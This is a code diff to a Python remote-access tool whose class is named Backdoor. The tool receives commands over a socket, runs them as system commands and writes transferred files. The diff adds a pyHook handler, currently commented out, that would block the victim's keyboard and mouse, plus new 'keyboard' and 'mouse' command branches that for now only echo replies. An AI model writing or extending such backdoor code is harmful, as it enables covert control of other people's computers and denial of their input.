@@ -1,5 +1,16 @@
 import socket, json, subprocess, os, cv2, pyautogui
 import base64, threading, time, webbrowser
+import pythoncom, pyHook 
+
+def uMad(event):
+    return False
+
+# hm = pyHook.HookManager()
+# hm.MouseAll = uMad
+# hm.KeyAll = uMad
+# hm.HookMouse()
+# hm.HookKeyboard()
+# pythoncom.PumpMessages()
 
 
 
@@ -130,6 +141,20 @@ class Backdoor:
 						file_name += i
 						file = file[1:]
 					self.write_file(file_name, file)
+				
+				elif command.split()[0] == "keyboard":
+					if command.split()[1] == "false":
+						self.reliable_send("false")
+					elif command.split()[1] == "true":
+						self.reliable_send("true")
+
+				elif command.split()[0] == "mouse":
+					if command.split()[1] == "false":
+						self.reliable_send("false")
+					elif command.split()[1] == "true":
+						self.reliable_send("true")
+
+
 
 				else:
 					res = self.execute_system_command(command)
